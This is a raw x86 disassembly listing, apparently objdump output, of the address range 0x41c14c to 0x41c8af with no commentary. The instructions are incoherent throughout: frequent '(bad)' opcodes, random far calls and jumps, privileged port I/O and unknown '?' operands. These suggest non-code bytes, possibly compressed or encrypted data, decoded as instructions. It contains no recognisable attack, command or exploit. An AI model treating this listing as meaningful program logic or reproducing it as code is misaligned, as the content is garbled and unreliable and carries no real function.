  41c14c:	lock fnstsw WORD PTR [edx-0x472f8b86]
  41c153:	out    0x75,al
  41c155:	dec    ecx
  41c156:	lahf   
  41c157:	(bad)  
  41c158:	jmp    0x41c0ea
  41c15a:	stos   BYTE PTR es:[edi],al
  41c15b:	(bad)  
  41c15c:	(bad)  
  41c15e:	fldenv [edi+0x18]
  41c161:	xor    DWORD PTR [edx-0x5f6d1012],ecx
  41c167:	jg     0x41c126
  41c169:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c16a:	lock sbb ebp,DWORD PTR [eax-0x52bf899d]
  41c171:	dec    edi
  41c172:	mov    ds:0x446bac89,eax
  41c177:	adc    BYTE PTR [ebp+0x6e],bh
  41c17a:	mov    ds:0xa45abc4a,al
  41c17f:	es hlt 
  41c181:	jg     0x41c1cf
  41c183:	call   0xe3e7:0xaa490139
  41c18a:	es ds push eax
  41c18d:	cli    
  41c18e:	clc    
  41c18f:	ins    DWORD PTR es:[edi],dx
  41c190:	mov    dh,0x2c
  41c192:	lock js 0x41c163
  41c195:	not    DWORD PTR [esi+edx*1-0x18]
  41c199:	in     eax,dx
  41c19a:	mov    eax,0x5c4bac6b
  41c19f:	or     bh,BYTE PTR [ebx-0x7f]
  41c1a2:	add    al,BYTE PTR [ebx]
  41c1a4:	mov    DWORD PTR [edi],ebp
  41c1a6:	out    0xcb,al
  41c1a8:	ss mov edx,0xed50a29e
  41c1ae:	jl     0x41c164
  41c1b0:	or     edi,DWORD PTR [edx]
  41c1b2:	dec    edx
  41c1b3:	mul    DWORD PTR [ecx+ebp*8+0x71]
  41c1b7:	fisub  DWORD PTR [ebp-0x42]
  41c1ba:	stos   DWORD PTR es:[edi],eax
  41c1bb:	icebp  
  41c1bc:	xor    eax,0x3698ef6d
  41c1c1:	hlt    
  41c1c2:	xor    eax,0x5757073e
  41c1c7:	aam    0x9c
  41c1c9:	inc    esi
  41c1ca:	jg     0x41c20d
  41c1cc:	test   al,0x95
  41c1ce:	int3   
  41c1cf:	cmc    
  41c1d0:	push   esi
  41c1d1:	mov    bl,0x3
  41c1d3:	or     edx,DWORD PTR [eax+0x1ae52d74]
  41c1d9:	(bad)  
  41c1da:	mov    cl,0xfc
  41c1dc:	xchg   DWORD PTR [ebx],ebp
  41c1de:	mov    bl,0xbc
  41c1e0:	push   es
  41c1e1:	push   ss
  41c1e2:	mov    eax,ds:0xabcdc9c0
  41c1e7:	enter  0x7d45,0xaf
  41c1eb:	(bad)  
  41c1ec:	leave  
  41c1ed:	stc    
  41c1ee:	test   dh,0xdb
  41c1f1:	ja     0x41c190
  41c1f3:	int3   
  41c1f4:	mov    ds:0xdb4318a3,eax
  41c1f9:	daa    
  41c1fa:	sub    DWORD PTR [edx-0x20],ecx
  41c1fd:	sbb    al,0x40
  41c1ff:	imul   eax,esp,0xe1519b8f
  41c205:	dec    ebp
  41c206:	mov    dl,0x4f
  41c208:	ror    DWORD PTR [edx],cl
  41c20a:	popf   
  41c20b:	rcr    eax,cl
  41c20d:	or     eax,edi
  41c20f:	mov    bl,0x79
  41c211:	or     bh,BYTE PTR [ebp-0x3d]
  41c214:	int    0x3d
  41c216:	mov    edx,0xf045067f
  41c21b:	sar    eax,0xa9
  41c21e:	cmp    ch,BYTE PTR [ebx]
  41c220:	push   0xc
  41c222:	jge    0x41c269
  41c224:	jmp    DWORD PTR [esi+ecx*2-0xf]
  41c228:	inc    ebx
  41c229:	mov    ch,0x30
  41c22b:	arpl   WORD PTR [edx],sp
  41c22d:	clc    
  41c22e:	dec    ebx
  41c22f:	repz cld 
  41c231:	push   0xc84b9b63
  41c236:	mov    edi,0x9334aee1
  41c23c:	dec    edx
  41c23d:	test   DWORD PTR [esi],esp
  41c23f:	nop
  41c240:	and    eax,0x9ba9cd53
  41c245:	shl    ebx,0xd3
  41c248:	fistp  QWORD PTR [edx-0x15]
  41c24b:	sbb    bl,0xb2
  41c24e:	clc    
  41c24f:	icebp  
  41c250:	in     eax,0x7a
  41c252:	shl    DWORD PTR [esi-0x6a18f427],cl
  41c258:	sub    DWORD PTR [ebx-0x2af176ca],ebp
  41c25e:	or     ecx,0x4599e4bf
  41c264:	push   es
  41c265:	jo     0x41c273
  41c267:	dec    edx
  41c268:	shr    BYTE PTR [edx+0x731df994],1
  41c26e:	dec    esp
  41c26f:	cmp    al,0x34
  41c271:	adc    edx,esp
  41c273:	push   ss
  41c274:	cdq    
  41c275:	mov    ebx,0xde05827d
  41c27a:	or     al,0x13
  41c27c:	dec    edx
  41c27d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c27e:	aad    0x4b
  41c280:	test   eax,0x3a752f2
  41c285:	mov    edx,0x88bf1963
  41c28a:	dec    BYTE PTR [edi+0x11eb1323]
  41c290:	pushf  
  41c291:	and    ah,BYTE PTR [eax+0x43]
  41c294:	xor    bh,cl
  41c296:	fild   QWORD PTR [edi]
  41c298:	jbe    0x41c24d
  41c29a:	aaa    
  41c29b:	iret   
  41c29c:	adc    di,WORD PTR [esi]
  41c29f:	mov    esi,0x76d3ed3c
  41c2a4:	cmp    BYTE PTR [eax+0x7],cl
  41c2a7:	mov    al,0xb
  41c2a9:	mov    al,ds:0xe8856157
  41c2ae:	sbb    ebp,DWORD PTR [ecx]
  41c2b0:	xor    eax,0xfbfe0aa1
  41c2b5:	aad    0x6f
  41c2b7:	mov    cs,WORD PTR es:[ebx-0x461c9d78]
  41c2be:	adc    eax,0xa2b0388
  41c2c3:	retf   
  41c2c4:	dec    esi
  41c2c5:	loop   0x41c248
  41c2c7:	int3   
  41c2c8:	xor    al,0x36
  41c2ca:	sbb    ah,BYTE PTR [edi-0x41]
  41c2cd:	xchg   bx,ax
  41c2cf:	fcom   DWORD PTR [ecx]
  41c2d1:	imul   esi,DWORD PTR [ebx-0x1a],0xffffffbe
  41c2d5:	dec    esi
  41c2d6:	jl     0x41c33d
  41c2d8:	push   ecx
  41c2d9:	loopne 0x41c2cb
  41c2db:	ss out dx,eax
  41c2dd:	out    dx,eax
  41c2de:	nop
  41c2df:	mov    ebx,0xa686d44e
  41c2e4:	inc    edi
  41c2e5:	inc    ebx
  41c2e6:	mov    bl,BYTE PTR [ecx]
  41c2e8:	in     eax,dx
  41c2e9:	ret    0xe793
  41c2ec:	mov    esi,eax
  41c2ee:	push   0xcb54c9ab
  41c2f3:	jae    0x41c303
  41c2f5:	arpl   WORD PTR [ecx-0x24],sp
  41c2f8:	push   ebp
  41c2f9:	rcl    DWORD PTR [edi+0x281d11f8],0x34
  41c300:	(bad)  
  41c301:	sbb    DWORD PTR [ebx+ecx*8],ecx
  41c304:	iret   
  41c305:	or     al,0x8a
  41c307:	ret    
  41c308:	push   ecx
  41c309:	pushf  
  41c30a:	aad    0xa
  41c30c:	mov    BYTE PTR [ebp-0x4a],bl
  41c30f:	sti    
  41c310:	jns    0x41c2dd
  41c312:	fld    TBYTE PTR [esi-0xe]
  41c315:	sbb    ebp,DWORD PTR [esi]
  41c317:	xchg   edi,eax
  41c318:	stos   BYTE PTR es:[edi],al
  41c319:	(bad)  
  41c31a:	cmp    edx,DWORD PTR [edx]
  41c31c:	jo     0x41c399
  41c31e:	add    ebp,DWORD PTR [ebx]
  41c320:	ret    0xdaeb
  41c323:	aam    0x29
  41c325:	fdivp  st(4),st
  41c327:	pop    esp
  41c328:	mov    edi,0x6d123482
  41c32d:	ds xchg ebp,eax
  41c32f:	jo     0x41c2d4
  41c331:	retf   0x37db
  41c334:	cwde   
  41c335:	mov    ds:0x7bc9f82,al
  41c33a:	(bad)  
  41c33c:	fstp   QWORD PTR [esi-0x31baa81b]
  41c342:	call   0xc9f38c1d
  41c347:	out    dx,eax
  41c348:	rcl    BYTE PTR [ecx-0x5f],cl
  41c34b:	push   ds
  41c34c:	test   BYTE PTR ss:[ebx-0x13d5f919],dh
  41c353:	and    eax,0x4edf5cb0
  41c358:	imul   esi,DWORD PTR [edi-0x2a],0x9618a3d3
  41c35f:	push   ecx
  41c360:	cwde   
  41c361:	daa    
  41c362:	dec    edi
  41c363:	repnz inc edi
  41c365:	or     dh,BYTE PTR [eax+esi*1]
  41c368:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c369:	pop    ebp
  41c36a:	fwait
  41c36b:	pop    ebp
  41c36c:	jo     0x41c3e2
  41c36e:	add    ebp,ebp
  41c370:	xchg   edi,eax
  41c371:	(bad)  
  41c372:	mov    edx,0xe939c1e7
  41c377:	outs   dx,DWORD PTR ds:[esi]
  41c378:	aam    0x76
  41c37a:	mov    eax,0xd2a2d6bd
  41c37f:	jbe    0x41c3c5
  41c381:	jmp    0x96e4:0x1c10f77e
  41c388:	inc    ebp
  41c389:	and    al,0x52
  41c38b:	ja     0x41c324
  41c38d:	outs   dx,BYTE PTR ds:[esi]
  41c38e:	daa    
  41c38f:	sar    DWORD PTR [ecx],cl
  41c391:	or     edx,DWORD PTR [esi-0x7e576f83]
  41c397:	ret    0xb89
  41c39a:	sub    al,0xb2
  41c39c:	mov    ?,ecx
  41c39e:	sbb    al,0xb3
  41c3a0:	stos   BYTE PTR es:[edi],al
  41c3a1:	xchg   edx,eax
  41c3a2:	out    dx,al
  41c3a3:	xor    eax,0x9596cd41
  41c3a8:	dec    esp
  41c3a9:	cmp    ecx,ecx
  41c3ab:	mov    al,0x7f
  41c3ad:	mov    dl,0x9c
  41c3af:	(bad)  
  41c3b0:	inc    ebp
  41c3b1:	mov    bh,0xcc
  41c3b3:	sub    al,0xda
  41c3b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3b6:	dec    edi
  41c3b7:	xor    BYTE PTR [edi-0x67490e06],ch
  41c3bd:	dec    esi
  41c3be:	rcl    BYTE PTR [eax+0x57],1
  41c3c1:	pop    ds
  41c3c2:	pop    ss
  41c3c3:	xchg   esi,eax
  41c3c4:	jge    0x41c43b
  41c3c6:	nop
  41c3c7:	lods   al,BYTE PTR ds:[esi]
  41c3c8:	or     al,0x33
  41c3ca:	rcl    DWORD PTR es:[edx],1
  41c3cd:	sbb    eax,0xe1334329
  41c3d2:	add    edi,DWORD PTR [ebp-0x3a739918]
  41c3d8:	rcl    BYTE PTR [edx],0xbb
  41c3db:	mov    eax,ds:0xa58191a2
  41c3e0:	repnz fistp WORD PTR [eax-0x46]
  41c3e4:	mov    al,ds:0x8bd210f6
  41c3e9:	cmp    ebp,DWORD PTR [ecx+0x6]
  41c3ec:	push   eax
  41c3ed:	pop    ss
  41c3ee:	repnz nop
  41c3f0:	inc    ecx
  41c3f1:	and    eax,0xa04527a4
  41c3f6:	mov    dl,0xaa
  41c3f8:	push   eax
  41c3f9:	jo     0x41c38b
  41c3fb:	jbe    0x41c429
  41c3fd:	push   es
  41c3fe:	in     al,dx
  41c3ff:	ret    
  41c400:	ret    0xb846
  41c403:	out    dx,eax
  41c404:	adc    bl,ch
  41c406:	fmul   QWORD PTR [edx-0x35bf9641]
  41c40c:	mov    WORD PTR ss:[eax],cs
  41c40f:	jo     0x41c476
  41c411:	rcr    BYTE PTR [ebx],0x7
  41c414:	pop    ss
  41c415:	lods   al,BYTE PTR ds:[esi]
  41c416:	pop    ecx
  41c417:	test   BYTE PTR [esi-0x47ae1b9d],0x47
  41c41e:	cmp    ch,BYTE PTR [ecx+0x74]
  41c421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c422:	retf   0x1af0
  41c425:	inc    esi
  41c426:	hlt    
  41c427:	and    dl,BYTE PTR [edi-0x62]
  41c42a:	sahf   
  41c42b:	dec    edx
  41c42c:	and    BYTE PTR [esi],0x87
  41c42f:	and    BYTE PTR [edx+0x4f332924],dl
  41c435:	iret   
  41c436:	aam    0x98
  41c438:	mov    bl,0x48
  41c43a:	push   ebx
  41c43b:	push   ecx
  41c43c:	repz scas eax,DWORD PTR es:[edi]
  41c43e:	or     DWORD PTR [edi+0x4396ec2e],ecx
  41c444:	mov    ds:0x68067f0b,eax
  41c449:	jmp    0xa0fd:0x6d47039a
  41c450:	or     edx,DWORD PTR [ebx]
  41c452:	jl     0x41c467
  41c454:	or     al,0x7b
  41c456:	arpl   WORD PTR ds:0xd635b97d,bx
  41c45c:	jmp    0x41c439
  41c45e:	jp     0x41c471
  41c460:	mov    ds:0x6c53d8d6,eax
  41c465:	(bad)  
  41c466:	lock jmp 0x41c49d
  41c469:	rol    DWORD PTR [ebx+0x62],1
  41c46c:	adc    al,0x78
  41c46e:	xchg   esp,eax
  41c46f:	sub    DWORD PTR [esi-0x10adb95d],eax
  41c475:	loopne 0x41c43f
  41c477:	leave  
  41c478:	sbb    dh,BYTE PTR [ebx-0x7a]
  41c47b:	test   al,0xa3
  41c47d:	mov    ch,0x83
  41c47f:	cmp    esi,edx
  41c481:	xrelease mov DWORD PTR [edi+ebp*1+0x22],edi
  41c486:	imul   DWORD PTR [edx]
  41c488:	mov    ecx,0x62c63d64
  41c48d:	jnp    0x41c4d0
  41c48f:	jno    0x41c465
  41c491:	inc    esp
  41c492:	mov    al,0x5e
  41c494:	push   edi
  41c495:	or     BYTE PTR [esi-0x3e],dh
  41c498:	sbb    bl,bh
  41c49a:	adc    BYTE PTR [ebx-0x21],ah
  41c49d:	loopne 0x41c43a
  41c49f:	int    0x3f
  41c4a1:	les    esi,FWORD PTR [ebp-0x44c60630]
  41c4a7:	bound  esp,QWORD PTR [esi]
  41c4a9:	jns    0x41c516
  41c4ab:	test   BYTE PTR cs:[ebx],ah
  41c4ae:	or     al,0x2c
  41c4b0:	mov    BYTE PTR [esi+0x2fa05de2],dl
  41c4b6:	imul   eax,esp,0xc35fed1f
  41c4bc:	(bad)  
  41c4bd:	fistp  WORD PTR [ebp-0x23]
  41c4c0:	sub    esp,esp
  41c4c2:	mov    dl,0xf0
  41c4c4:	scas   al,BYTE PTR es:[edi]
  41c4c5:	push   ds
  41c4c6:	sub    BYTE PTR [esi+eax*2+0x61198bb4],0x8c
  41c4ce:	adc    ch,al
  41c4d0:	rcl    BYTE PTR [ecx-0x46],cl
  41c4d3:	adc    al,0xb6
  41c4d5:	pop    es
  41c4d6:	sbb    DWORD PTR [ecx+0xc],0x5c
  41c4da:	and    bh,ah
  41c4dc:	cmp    BYTE PTR [ecx+0x17],ah
  41c4df:	(bad)  
  41c4e0:	mov    bh,ch
  41c4e2:	sub    DWORD PTR [eax-0x4a],ebp
  41c4e5:	nop
  41c4e6:	addr16 push ecx
  41c4e8:	sbb    esp,DWORD PTR [ecx+0x7779941f]
  41c4ee:	dec    esi
  41c4ef:	xor    DWORD PTR [edx-0x297e379f],eax
  41c4f5:	jo     0x41c524
  41c4f7:	dec    ecx
  41c4f8:	ds mov cl,0x76
  41c4fb:	scas   eax,DWORD PTR es:[edi]
  41c4fc:	daa    
  41c4fd:	sub    DWORD PTR [edx+ebp*2-0x225ba3f9],0x855d8fae
  41c508:	loop   0x41c4a5
  41c50a:	pushf  
  41c50b:	outs   dx,DWORD PTR ds:[esi]
  41c50c:	cmp    esi,eax
  41c50e:	mov    ?,WORD PTR [esi-0x7b859fa4]
  41c514:	std    
  41c515:	push   esi
  41c516:	js     0x41c4f9
  41c518:	repz mov bh,0x1d
  41c51b:	jp     0x41c58e
  41c51d:	jmp    0x41c554
  41c51f:	gs add al,0x45
  41c522:	es jecxz 0x41c523
  41c525:	pop    edx
  41c526:	jne    0x41c4d8
  41c528:	cmc    
  41c529:	inc    esi
  41c52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c52b:	hlt    
  41c52c:	fist   WORD PTR [esi]
  41c52e:	sti    
  41c52f:	outs   dx,BYTE PTR ds:[esi]
  41c530:	lock sub esp,DWORD PTR [eax+ebx*1]
  41c534:	pop    edi
  41c535:	aas    
  41c536:	xchg   BYTE PTR [ebx],cl
  41c538:	cli    
  41c539:	cmp    DWORD PTR [ebx+ebx*8],ecx
  41c53c:	out    dx,eax
  41c53d:	ret    0x778a
  41c540:	mov    WORD PTR [edx],?
  41c542:	jmp    0xb568:0x947cabfb
  41c549:	sbb    edx,ebx
  41c54b:	pop    eax
  41c54c:	mov    ah,0x92
  41c54e:	call   FWORD PTR [ebx-0x65]
  41c551:	fwait
  41c552:	cs test eax,0x582bd756
  41c558:	outs   dx,DWORD PTR ds:[esi]
  41c559:	jecxz  0x41c504
  41c55b:	mov    ds:0xe723942e,al
  41c560:	fbstp  TBYTE PTR [esi+0x42]
  41c563:	xchg   edx,eax
  41c564:	xor    DWORD PTR [ecx+0xed101c5],0xfb1ecaf9
  41c56e:	(bad)  
  41c56f:	jecxz  0x41c5db
  41c571:	and    eax,0x97c5a71e
  41c576:	mov    WORD PTR [ebp-0x3655ea96],ss
  41c57c:	mov    esp,0xee2e1996
  41c581:	bound  ebx,QWORD PTR [esi+esi*8]
  41c584:	push   esp
  41c585:	xor    eax,0xc36c6c03
  41c58a:	mov    ah,0x30
  41c58c:	retf   0x6e11
  41c58f:	out    dx,al
  41c590:	js     0x41c58a
  41c592:	or     BYTE PTR [eax-0x4d],bl
  41c595:	xchg   DWORD PTR [ecx+eax*2],edx
  41c598:	retf   
  41c599:	push   ecx
  41c59a:	jae    0x41c549
  41c59c:	(bad)  
  41c59d:	pushf  
  41c59e:	jl     0x41c55f
  41c5a0:	es pop ds
  41c5a2:	sbb    dh,ch
  41c5a4:	fld    st(1)
  41c5a6:	sti    
  41c5a7:	cmp    eax,0x958a880c
  41c5ac:	and    BYTE PTR [ebx+0x34],bl
  41c5af:	call   0xa784:0x9008499d
  41c5b6:	jne    0x41c586
  41c5b8:	sar    BYTE PTR [ebx-0x5f85b6a4],1
  41c5be:	push   ebp
  41c5bf:	or     cl,BYTE PTR [edi-0x79]
  41c5c2:	cld    
  41c5c3:	inc    ecx
  41c5c4:	adc    al,0x51
  41c5c6:	push   ss
  41c5c7:	rol    BYTE PTR [edi+0x7c],0xfb
  41c5cb:	arpl   ax,cx
  41c5cd:	addr16 cld 
  41c5cf:	ret    0xaefd
  41c5d2:	pop    esp
  41c5d3:	jae    0x41c597
  41c5d5:	sub    dh,dl
  41c5d7:	out    0x50,al
  41c5d9:	or     DWORD PTR [eax+0x37],eax
  41c5dc:	out    0xdb,eax
  41c5de:	jle    0x41c58b
  41c5e0:	sub    bh,BYTE PTR [eax-0x3b]
  41c5e3:	inc    ebp
  41c5e4:	add    al,0x80
  41c5e6:	push   ebp
  41c5e7:	mov    bh,0x3d
  41c5e9:	aad    0x13
  41c5eb:	mov    ecx,0x9f259ff1
  41c5f0:	and    DWORD PTR [edi],ebx
  41c5f2:	sub    al,0x70
  41c5f4:	mov    edx,0x642b07c5
  41c5f9:	xor    cl,BYTE PTR [edx+0x31]
  41c5fc:	xchg   ecx,eax
  41c5fd:	jns    0x41c5a7
  41c5ff:	or     ch,BYTE PTR [ecx]
  41c601:	inc    eax
  41c602:	(bad)  
  41c603:	xchg   ecx,eax
  41c604:	cmc    
  41c605:	addr16 push ds
  41c607:	and    DWORD PTR [edi+eiz*4+0x698d2007],ecx
  41c60e:	add    al,0xae
  41c610:	int    0xeb
  41c612:	sbb    eax,0x990e7486
  41c617:	cvtdq2ps xmm2,XMMWORD PTR [ebx]
  41c61a:	inc    eax
  41c61b:	and    eax,0xbbd5b2ca
  41c620:	and    DWORD PTR [edx+0x4c],edx
  41c623:	out    dx,eax
  41c624:	popa   
  41c625:	(bad)  
  41c626:	in     al,dx
  41c627:	inc    esp
  41c628:	pop    eax
  41c629:	dec    ecx
  41c62a:	retf   
  41c62b:	push   esp
  41c62c:	sub    BYTE PTR [edx+0x1e],bh
  41c62f:	push   es
  41c630:	js     0x41c5c8
  41c632:	cmp    BYTE PTR [ebp+0xb3968d4],bh
  41c638:	pop    es
  41c639:	pop    ebx
  41c63a:	neg    BYTE PTR [edi+0x4687c05f]
  41c640:	cld    
  41c641:	js     0x41c6a3
  41c643:	adc    al,0x1b
  41c645:	jbe    0x41c5d4
  41c647:	mov    al,ds:0x45155551
  41c64c:	add    DWORD PTR [ebp-0x682fefeb],esi
  41c652:	jg     0x41c679
  41c654:	(bad)  
  41c656:	cs jecxz 0x41c65d
  41c659:	lods   al,BYTE PTR ds:[esi]
  41c65a:	mov    ebp,0x40181b0
  41c65f:	std    
  41c660:	and    edi,0x58
  41c663:	cld    
  41c664:	mov    eax,ds:0x17dfb69b
  41c669:	lods   al,BYTE PTR ds:[esi]
  41c66a:	aas    
  41c66b:	push   ss
  41c66c:	or     eax,DWORD PTR [edi+0x2b]
  41c66f:	cwde   
  41c670:	mov    cs,edi
  41c672:	mov    ds:0x1687be48,al
  41c677:	je     0x41c6c8
  41c679:	push   ebp
  41c67a:	lock add BYTE PTR [edi-0x1479e6b7],ah
  41c681:	mov    ?,WORD PTR [eax-0x6d]
  41c684:	ins    BYTE PTR es:[edi],dx
  41c685:	or     DWORD PTR [esi],eax
  41c687:	cmp    DWORD PTR [esi+eiz*2-0x3b],ecx
  41c68b:	lea    edx,[eax]
  41c68d:	xor    BYTE PTR [esi+ebp*1],dl
  41c690:	jbe    0x41c682
  41c692:	mov    dl,0xe7
  41c694:	je     0x41c6f3
  41c696:	pop    edi
  41c697:	jo     0x41c6ca
  41c699:	lock sbb DWORD PTR [ebx-0x25],ebx
  41c69d:	push   eax
  41c69e:	mov    ds:0x55875d52,al
  41c6a3:	jb     0x41c6fc
  41c6a5:	dec    esi
  41c6a6:	jmp    0x1a4d067
  41c6ab:	pop    esp
  41c6ac:	sar    ch,1
  41c6ae:	imul   edi,DWORD PTR [eax-0x62122661],0xffffffe1
  41c6b5:	xchg   ecx,eax
  41c6b6:	add    ah,BYTE PTR [edx+0x413a1dac]
  41c6bc:	mov    eax,0x643f64ab
  41c6c1:	push   ecx
  41c6c2:	push   ebx
  41c6c3:	add    DWORD PTR [esi+0x7e],esp
  41c6c6:	popa   
  41c6c7:	xchg   esp,eax
  41c6c8:	mov    ?,WORD PTR [edx-0x2c]
  41c6cb:	fisubr DWORD PTR [ecx]
  41c6cd:	adc    bl,BYTE PTR [esi]
  41c6cf:	test   DWORD PTR [ebx+0x55243412],0xd325dd7d
  41c6d9:	push   edx
  41c6da:	sbb    cl,BYTE PTR [ebp-0x49]
  41c6dd:	mov    edx,0xeb1aa03d
  41c6e2:	repz retf 
  41c6e4:	adc    bh,BYTE PTR [ebx+0x14]
  41c6e7:	pop    ebx
  41c6e8:	push   edi
  41c6e9:	cdq    
  41c6ea:	popf   
  41c6eb:	dec    esp
  41c6ec:	or     ah,dh
  41c6ee:	(bad)  
  41c6f0:	mov    dl,0xb7
  41c6f2:	adc    dl,BYTE PTR [ebp+0x23]
  41c6f5:	dec    ecx
  41c6f6:	mov    esi,0x591bc408
  41c6fb:	leave  
  41c6fc:	adc    DWORD PTR [ebp+0x9398d74],ebp
  41c702:	push   esp
  41c703:	sar    bl,0x1f
  41c706:	sbb    ebx,DWORD PTR [ebp+0x63beba93]
  41c70c:	cli    
  41c70d:	cmc    
  41c70e:	js     0x41c743
  41c710:	add    BYTE PTR [ecx],cl
  41c712:	mov    WORD PTR [eax],fs
  41c714:	and    eax,0xce536b76
  41c719:	sub    edi,DWORD PTR [eax-0x1d]
  41c71c:	pop    ebx
  41c71d:	fsubrp st(6),st
  41c71f:	in     eax,dx
  41c720:	outs   dx,DWORD PTR ds:[esi]
  41c721:	push   es
  41c722:	fnstenv [edi-0x1e]
  41c725:	sub    BYTE PTR [ebx+ebx*2],bh
  41c728:	clc    
  41c729:	mov    ds:0x8416da46,al
  41c72e:	out    dx,eax
  41c72f:	and    BYTE PTR [esi],dl
  41c731:	mov    eax,0xba80e7be
  41c736:	or     BYTE PTR [edx+0x2e],bh
  41c739:	jle    0x41c78d
  41c73b:	and    bl,BYTE PTR [ebx+0x47]
  41c73e:	mov    BYTE PTR [eax],cl
  41c740:	sbb    edi,eax
  41c742:	jb     0x41c6fa
  41c744:	inc    eax
  41c745:	jns    0x41c73c
  41c747:	push   esi
  41c748:	ss push es
  41c74a:	adc    al,BYTE PTR [ecx+0x74852e1d]
  41c750:	ret    0x3d4f
  41c753:	rcl    BYTE PTR [edx+0x6f5d7689],0xa3
  41c75a:	sub    al,0x3
  41c75c:	pop    edx
  41c75d:	cmp    ah,BYTE PTR [edi-0x25806139]
  41c763:	add    ebp,DWORD PTR [eax+0x5a46264d]
  41c769:	mov    al,ds:0xe3938fb6
  41c76e:	(bad)  
  41c76f:	aas    
  41c770:	int    0x63
  41c772:	std    
  41c773:	in     eax,dx
  41c774:	dec    eax
  41c775:	bnd jge 0x41c6ff
  41c778:	jo     0x41c767
  41c77a:	pushf  
  41c77b:	inc    ecx
  41c77c:	mov    al,0x28
  41c77f:	add    esp,DWORD PTR [edx+0x73fd99dc]
  41c785:	dec    esi
  41c786:	or     eax,0x77b2b96d
  41c78b:	xchg   ecx,eax
  41c78c:	aaa    
  41c78d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c78e:	pop    ss
  41c78f:	xor    bh,0xba
  41c792:	(bad)  
  41c794:	mov    cl,0xc3
  41c796:	mov    ebx,0xdc6b28b0
  41c79b:	xor    DWORD PTR ds:0xba78b1c8,ecx
  41c7a1:	fwait
  41c7a2:	gs inc eax
  41c7a4:	push   0xffffffc2
  41c7a6:	sub    ecx,ecx
  41c7a8:	inc    edx
  41c7a9:	iret   
  41c7aa:	fadd   DWORD PTR [edi]
  41c7ac:	retf   
  41c7ad:	out    dx,al
  41c7ae:	push   eax
  41c7af:	inc    ebx
  41c7b0:	pop    ds
  41c7b1:	xor    esi,DWORD PTR [ebp+0x731be4d5]
  41c7b7:	imul   eax,DWORD PTR [edx-0x2a],0xffffffc7
  41c7bb:	dec    eax
  41c7bc:	(bad)  
  41c7be:	inc    edx
  41c7bf:	xchg   ecx,eax
  41c7c0:	in     al,dx
  41c7c1:	mov    dh,0xb4
  41c7c3:	xchg   ecx,eax
  41c7c4:	mov    ch,0x9
  41c7c6:	add    al,BYTE PTR cs:[ebx]
  41c7c9:	shl    DWORD PTR [esi],1
  41c7cb:	mov    al,ds:0x23f0e9ba
  41c7d0:	mov    ah,0x88
  41c7d2:	jl     0x41c7c6
  41c7d4:	push   es
  41c7d5:	jne    0x41c83e
  41c7d7:	mov    bh,0x7c
  41c7d9:	pushf  
  41c7da:	pop    ds
  41c7db:	aaa    
  41c7dc:	scas   al,BYTE PTR es:[edi]
  41c7dd:	xchg   esp,eax
  41c7de:	rcl    BYTE PTR [esi+esi*4-0x5b1df637],cl
  41c7e5:	imul   eax,DWORD PTR [ecx-0x8],0xfffffff0
  41c7e9:	pop    edx
  41c7ea:	xchg   esp,eax
  41c7eb:	(bad)  
  41c7ec:	aad    0xb1
  41c7ee:	cmp    ebp,edi
  41c7f0:	add    bh,BYTE PTR [ebx]
  41c7f2:	mov    dh,0x4d
  41c7f4:	add    eax,0xd57e1f65
  41c7f9:	mov    dh,0x97
  41c7fb:	int    0xc6
  41c7fd:	push   edi
  41c7fe:	and    esi,eax
  41c800:	mov    edi,0xf19ee52c
  41c805:	std    
  41c806:	pop    esp
  41c807:	stos   BYTE PTR es:[edi],al
  41c808:	aam    0x7f
  41c80a:	test   ah,0xb3
  41c80d:	jns    0x41c86f
  41c80f:	or     BYTE PTR [ecx],dl
  41c811:	gs jp  0x41c857
  41c814:	cwde   
  41c815:	jbe    0x41c876
  41c817:	clc    
  41c818:	mov    ebx,eax
  41c81a:	shl    BYTE PTR [eax+ecx*8],0x6b
  41c81e:	xor    DWORD PTR [edi],edx
  41c820:	or     eax,0x2c11dccd
  41c825:	fadd   DWORD PTR [ecx+ebx*4+0x51]
  41c829:	test   DWORD PTR ds:0x7eb9048c,ebp
  41c82f:	mov    ds:0x15e0c103,al
  41c834:	inc    eax
  41c835:	fist   WORD PTR [esi+0x24925746]
  41c83b:	pop    ss
  41c83c:	mov    eax,0xe4a715db
  41c841:	adc    al,0x4e
  41c843:	fidivr WORD PTR [ecx+0x6]
  41c846:	rol    BYTE PTR [edx],0x9c
  41c849:	add    dh,BYTE PTR [ecx+0x27]
  41c84c:	dec    esp
  41c84d:	das    
  41c84e:	add    bl,ah
  41c850:	lods   al,BYTE PTR ds:[esi]
  41c851:	inc    esi
  41c852:	dec    ecx
  41c853:	frstor [ecx]
  41c855:	add    esp,esi
  41c857:	mov    ecx,0xaff9cffd
  41c85c:	inc    esi
  41c85d:	stos   BYTE PTR es:[edi],al
  41c85e:	ficomp DWORD PTR [ebp+edx*8+0x3c]
  41c862:	(bad)  
  41c863:	mov    edi,0xefea6294
  41c868:	clc    
  41c869:	xor    cl,ch
  41c86b:	push   0x4022979
  41c870:	outs   dx,DWORD PTR ds:[esi]
  41c871:	(bad)  
  41c872:	(bad)  
  41c873:	div    BYTE PTR [ebp+0x17]
  41c876:	sub    ebx,ebx
  41c878:	xlat   BYTE PTR ds:[ebx]
  41c879:	add    cl,BYTE PTR [eax+0x40]
  41c87c:	add    ecx,DWORD PTR [ebx-0x9]
  41c87f:	push   ss
  41c880:	mov    al,0xf6
  41c882:	mov    WORD PTR [edx],gs
  41c884:	ret    0x755d
  41c887:	icebp  
  41c888:	outs   dx,BYTE PTR ds:[esi]
  41c889:	xlat   BYTE PTR ds:[ebx]
  41c88a:	sub    eax,0x99ed04a9
  41c88f:	ror    BYTE PTR [edi-0x44],1
  41c892:	mov    BYTE PTR ds:0xb1d939c6,al
  41c898:	dec    eax
  41c899:	inc    BYTE PTR [edi+0x55a39093]
  41c89f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8a0:	mov    bh,0x21
  41c8a2:	fwait
  41c8a3:	mul    DWORD PTR [edi+0x51704383]
  41c8a9:	push   eax
  41c8aa:	out    0x8e,al
  41c8ac:	in     eax,0xf7
  41c8ae:	pusha  
  41c8af:	in     al,dx
